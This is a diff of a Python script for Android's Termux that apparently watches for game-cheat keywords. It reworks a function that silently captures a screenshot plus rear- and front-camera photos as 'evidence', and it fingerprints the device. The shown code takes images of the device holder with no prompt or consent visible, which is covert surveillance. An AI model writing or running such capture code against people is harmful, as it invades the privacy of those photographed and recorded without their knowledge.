@@ -8,26 +8,39 @@ FORBIDDEN_KEYWORDS = ["antena", "headshot", "aimlock", "regedit", "modmenu", "by
 
 def capture_all_evidence():
     evidences = {}
+    paths_to_clean = []
     
-    # 1. Screenshot Layar
+    # 1. Screenshot (Gunakan try agar tidak crash jika tool tidak ada)
     ss_name = f"ss_{int(time.time())}.png"
-    subprocess.run(["termux-screenshot", ss_name], capture_output=True)
-    if os.path.exists(ss_name):
-        evidences["ss"] = open(ss_name, "rb")
+    try:
+        subprocess.run(["termux-screenshot", ss_name], capture_output=True, timeout=5)
+        if os.path.exists(ss_name):
+            evidences["ss"] = open(ss_name, "rb")
+            paths_to_clean.append(ss_name)
+    except FileNotFoundError:
+        print("[!] Tool termux-screenshot tidak ditemukan.")
+    except Exception as e:
+        print(f"[!] Gagal screenshot: {e}")
 
-    # 2. Foto Kamera Belakang (ID: 0 biasanya belakang)
+    # 2. Kamera Belakang
     cam_back = f"back_{int(time.time())}.jpg"
-    subprocess.run(["termux-camera-photo", "-c", "0", cam_back], capture_output=True)
-    if os.path.exists(cam_back):
-        evidences["cam_back"] = open(cam_back, "rb")
+    try:
+        subprocess.run(["termux-camera-photo", "-c", "0", cam_back], capture_output=True, timeout=10)
+        if os.path.exists(cam_back):
+            evidences["cam_back"] = open(cam_back, "rb")
+            paths_to_clean.append(cam_back)
+    except: pass
 
-    # 3. Foto Kamera Depan (ID: 1 biasanya depan)
+    # 3. Kamera Depan
     cam_front = f"front_{int(time.time())}.jpg"
-    subprocess.run(["termux-camera-photo", "-c", "1", cam_front], capture_output=True)
-    if os.path.exists(cam_front):
-        evidences["cam_front"] = open(cam_front, "rb")
+    try:
+        subprocess.run(["termux-camera-photo", "-c", "1", cam_front], capture_output=True, timeout=10)
+        if os.path.exists(cam_front):
+            evidences["cam_front"] = open(cam_front, "rb")
+            paths_to_clean.append(cam_front)
+    except: pass
 
-    return evidences, [ss_name, cam_back, cam_front]
+    return evidences, paths_to_clean
 
 def get_hwid():
     raw = f"{platform.machine()}{platform.processor()}{platform.node()}"
